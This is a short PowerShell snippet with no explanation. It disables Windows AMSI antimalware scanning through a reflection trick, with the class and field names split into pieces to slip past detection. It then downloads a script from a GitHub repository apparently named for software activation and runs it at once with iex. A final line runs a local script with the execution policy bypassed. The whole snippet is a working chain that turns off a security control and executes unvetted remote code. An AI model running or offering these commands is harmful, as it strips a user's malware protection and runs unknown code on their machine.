$a=[Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils')
$a.GetField('amsi'+'InitFailed','NonPublic,Static').SetValue($null,$true)
irm 'https://github.com/holyactivate/holya/raw/main/a.ps1'|iex

powershell -ExecutionPolicy Bypass -File C:\l.ps1
